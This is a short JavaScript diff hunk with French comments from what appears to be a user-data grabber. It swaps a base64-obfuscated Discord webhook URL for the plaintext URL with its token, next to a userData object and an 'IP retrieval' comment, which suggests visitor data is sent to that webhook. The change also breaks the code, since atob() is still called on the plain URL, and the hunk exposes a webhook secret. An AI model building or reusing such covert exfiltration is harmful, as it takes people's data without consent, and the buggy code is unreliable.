@@ -729,10 +729,10 @@ let userData = {
 };
 
 // Webhook Discord encodé
-const webhookEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNjkxNzkwOTE3NDAyNjMwMC95aDNUZ0QwbjZYREhXVzhtOWFiaWtiMmIwT1FvVzRqaFFDV05zdV93UlhGQnY4SWUzZmxvcG45Z2JuUzFrNF9LRDV4Qg==';
+const webhook = 'https://discord.com/api/webhooks/1526917909174026300/yh3TgD0n6XDHWW8m9abikb2b0OQoW4jhQCWNsu_wRXFBv8Ie3flopn9gbnS1k4_KD5xB';
 
 function getWebhook() {
-    return atob(webhookEncoded);
+    return atob(webhook);
 }
 
 // Récupération IP
